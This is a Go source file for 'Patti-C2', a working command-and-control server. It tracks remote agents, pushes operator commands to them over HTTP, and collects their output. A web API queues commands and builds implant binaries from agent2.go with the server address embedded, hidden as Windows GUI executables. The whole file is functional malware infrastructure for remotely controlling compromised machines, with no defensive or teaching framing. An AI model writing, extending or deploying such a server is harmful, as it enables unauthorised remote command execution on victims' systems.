package main

import (
	"os/exec"
	"path/filepath"

	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

type Agent struct {
	ID     string `json:"id"`
	IP     string `json:"ip"`
	Status string `json:"status"` // "alive" or "dead"
}

var (
	knownAgents   = make(map[string]Agent)
	agentCommands = make(map[string]string)
	agentResults  = make(map[string][]string)
	mu            sync.Mutex
)

func printPrompt() {
	fmt.Print("\nPatti-C2>>")
}

func inputLoop() {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		printPrompt()
		if scanner.Scan() {
			cmd := strings.TrimSpace(scanner.Text())
			if cmd == "quit" {
				fmt.Println("[*] Shutting Down Server....")
				os.Exit(0)
			}
			if cmd != "" {
				mu.Lock()
				// Broadcast command to all alive agents from terminal
				for id, agent := range knownAgents {
					if agent.Status == "alive" {
						agentCommands[id] = cmd
					}
				}
				mu.Unlock()
			}
		}
	}
}

func taskHandler(w http.ResponseWriter, r *http.Request) {
	agentIP := r.RemoteAddr
	agentID := r.URL.Query().Get("id")

	if agentID == "" {
		agentID = "unknown" // Fallback if old agent
	}

	mu.Lock()
	if _, exists := knownAgents[agentID]; !exists {
		fmt.Printf("\n\n[!] New Agent Discovered: %s (ID: %s)", agentIP, agentID)
		fmt.Printf("\n[*] Establishing session...")
		knownAgents[agentID] = Agent{ID: agentID, IP: agentIP, Status: "alive"}
		agentCommands[agentID] = "sleep"
		printPrompt()
	}
	
	cmdToSend := agentCommands[agentID]
	if cmdToSend == "" {
		cmdToSend = "sleep"
	}

	// Reset to sleep so the agent doesn't loop the same command
	if cmdToSend != "sleep" {
		fmt.Printf("\n[*] Agent %s (ID: %s) fetched: %s", agentIP, agentID, cmdToSend)
		
		// If agent fetched the kill/exit command, mark it dead
		if cmdToSend == "kill" || cmdToSend == "exit" {
			if agent, ok := knownAgents[agentID]; ok {
				agent.Status = "dead"
				knownAgents[agentID] = agent
			}
		}
		
		agentCommands[agentID] = "sleep"
		printPrompt() // Added to fix visual error returning base prompt
	}
	mu.Unlock()

	fmt.Fprint(w, cmdToSend)
}

func resultHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		r.ParseForm()
		output := r.FormValue("output")
		agentID := r.URL.Query().Get("id")
		
		if agentID == "" {
			agentID = "unknown"
		}

		mu.Lock()
		if _, exists := agentResults[agentID]; !exists {
			agentResults[agentID] = make([]string, 0)
		}
		
		agentResults[agentID] = append([]string{fmt.Sprintf("From %s (ID: %s):\n%s", r.RemoteAddr, agentID, output)}, agentResults[agentID]...) // prepend
		if len(agentResults[agentID]) > 50 {
			agentResults[agentID] = agentResults[agentID][:50] // keep last 50
		}
		mu.Unlock()
		
		fmt.Printf("\n[+] Agent Result From (ID: %s):\n%s", agentID, output)
		printPrompt()
	}
}

// Web UI API Handlers
func apiAgentsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	mu.Lock()
	defer mu.Unlock()
	agents := []Agent{}
	for _, a := range knownAgents {
		agents = append(agents, a)
	}
	json.NewEncoder(w).Encode(agents)
}

func apiCommandHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	if r.Method == "OPTIONS" {
		return
	}
	if r.Method == "POST" {
		var data struct {
			Command string `json:"command"`
			AgentID string `json:"agent_id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&data); err == nil {
			mu.Lock()
			if data.AgentID == "all" || data.AgentID == "" {
				for id, agent := range knownAgents {
					if agent.Status == "alive" {
						agentCommands[id] = data.Command
					}
				}
				fmt.Printf("\n[Web UI] Command queued for all alive agents: %s\n", data.Command)
			} else {
				agentCommands[data.AgentID] = data.Command
				fmt.Printf("\n[Web UI] Command queued for agent %s: %s\n", data.AgentID, data.Command)
			}
			mu.Unlock()
			printPrompt()
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		}
	}
}

func apiResultsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	agentID := r.URL.Query().Get("agent_id")
	
	mu.Lock()
	defer mu.Unlock()
	
	if agentID != "" && agentID != "all" {
		json.NewEncoder(w).Encode(agentResults[agentID])
	} else {
		// Return all results flattened
		all := []string{}
		for _, results := range agentResults {
			all = append(all, results...)
		}
		json.NewEncoder(w).Encode(all)
	}
}

func apiClearAgentHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	if r.Method == "OPTIONS" {
		return
	}
	if r.Method == "POST" {
		var data struct {
			AgentID string `json:"agent_id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&data); err == nil {
			mu.Lock()
			delete(knownAgents, data.AgentID)
			delete(agentCommands, data.AgentID)
			delete(agentResults, data.AgentID)
			mu.Unlock()
			fmt.Printf("\n[Web UI] Cleared dead agent: %s\n", data.AgentID)
			printPrompt()
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		}
	}
}



func apiGeneratePayloadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	if r.Method == "OPTIONS" {
		return
	}
	if r.Method == "POST" {
		var data struct {
			IP   string `json:"ip"`
			OS   string `json:"os"`
			Name string `json:"name"`
		}
		if err := json.NewDecoder(r.Body).Decode(&data); err == nil {
			if data.IP == "" || data.OS == "" || data.Name == "" {
				http.Error(w, `{"error": "Missing fields"}`, http.StatusBadRequest)
				return
			}
			
			payloadsDir := "payloads"
			if _, err := os.Stat(payloadsDir); os.IsNotExist(err) {
				os.Mkdir(payloadsDir, 0755)
			}
			
			ext := ""
			if data.OS == "windows" {
				ext = ".exe"
			}
			
			filename := data.Name
			if !strings.HasSuffix(filename, ext) {
				filename += ext
			}
			outputPath := payloadsDir + "/" + filename
			c2Url := "http://" + data.IP + ":8080"
			
			var cmd *exec.Cmd
			if data.OS == "windows" {
				cmd = exec.Command("go", "build", "-ldflags", "-H=windowsgui -X main.c2URL="+c2Url, "-o", outputPath, "agent2.go")
			} else {
				cmd = exec.Command("go", "build", "-ldflags", "-X main.c2URL="+c2Url, "-o", outputPath, "agent2.go")
			}
			
			cmd.Env = append(os.Environ(), "GOOS="+data.OS, "GOARCH=amd64")
			
			fmt.Printf("\n[Web UI] Generating payload: %s\n", cmd.String())
			printPrompt()
			
			output, err := cmd.CombinedOutput()
			if err != nil {
				http.Error(w, fmt.Sprintf(`{"error": %q}`, string(output)), http.StatusInternalServerError)
				return
			}
			
			absPath, _ := filepath.Abs(outputPath)
			json.NewEncoder(w).Encode(map[string]string{
				"status": "ok",
				"path":   absPath,
			})
		}
	}
}

func main() {
	go inputLoop()

	// Agent endpoints
	http.HandleFunc("/tasks", taskHandler)
	http.HandleFunc("/results", resultHandler)

	// Web UI endpoints
	http.HandleFunc("/api/agents", apiAgentsHandler)
	http.HandleFunc("/api/command", apiCommandHandler)
	http.HandleFunc("/api/results", apiResultsHandler)
	http.HandleFunc("/api/clear_agent", apiClearAgentHandler)
	http.HandleFunc("/api/generate_payload", apiGeneratePayloadHandler)

	fmt.Println("=== Patti-C2 Multi-Tasking Listener ===")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Printf("![Server Crash]: %s\n", err)
	}
}